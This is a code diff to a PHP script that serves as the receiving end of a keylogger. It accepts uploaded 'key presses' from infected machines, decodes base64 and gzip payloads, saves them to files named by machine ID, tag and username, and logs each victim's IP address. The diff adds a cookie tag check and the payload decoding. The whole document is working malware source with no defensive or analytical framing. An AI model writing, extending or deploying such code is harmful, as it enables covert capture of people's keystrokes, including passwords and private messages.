@@ -4,7 +4,7 @@
 	// This is free software; you are free to change and redistribute it.
 	// There is NO WARRANTY, to the extent permitted by law.
 
-	if (isset($_SERVER['HTTP_CPU']) && isset($_SERVER['CONTENT_LENGTH']) && isset($_SERVER['HTTP_USER_AGENT']))
+	if (isset($_SERVER['HTTP_CPU']) && isset($_SERVER['CONTENT_LENGTH']) && isset($_SERVER['HTTP_USER_AGENT']) && isset($_COOKIE["tag"]))
 	{
 		date_default_timezone_set('US/Eastern');
 		$v_ip = $_SERVER['REMOTE_ADDR'];
@@ -17,18 +17,20 @@
 		$v_mesuredlen = strlen($v_post);
 
 		$v_username = substr($v_uname, 0, strpos($v_uname, ' '));
+		$v_tag = $_COOKIE["tag"];
 
-		if (strlen($v_machineid) == 32 && $v_mesuredlen > 0 && strlen($v_uname) > 0 && strlen($v_username) > 0)
+		if (strlen($v_machineid) == 32 && $v_mesuredlen > 0 && strlen($v_uname) > 0 && strlen($v_username) > 0 && strlen($v_tag) >= 10)
 		{
 			// Save key presses
-			$fp = fopen("$v_machineid-$v_username.txt", "w");
+			$fp = fopen("$v_machineid-$v_tag-$v_username.txt", "w");
 			$postdata = file_get_contents("php://input");
-			fputs($fp, $postdata);
+			$data = gzdecode(base64_decode($postdata));		// Decode the data
+			fputs($fp, $data);
 			fclose($fp);
 
 			// Logging
 			$fp = fopen("logs.txt", "a");
-			fputs($fp, "$v_uname with id $v_machineid and IP $v_ip sent $v_mesuredlen bytes on $v_date\r\n");
+			fputs($fp, "$v_uname with id $v_machineid and IP $v_ip sent $v_mesuredlen bytes on $v_date with tag $v_tag\r\n");
 			fclose($fp);
 
 			echo "\nServer: Logged successfully\n";
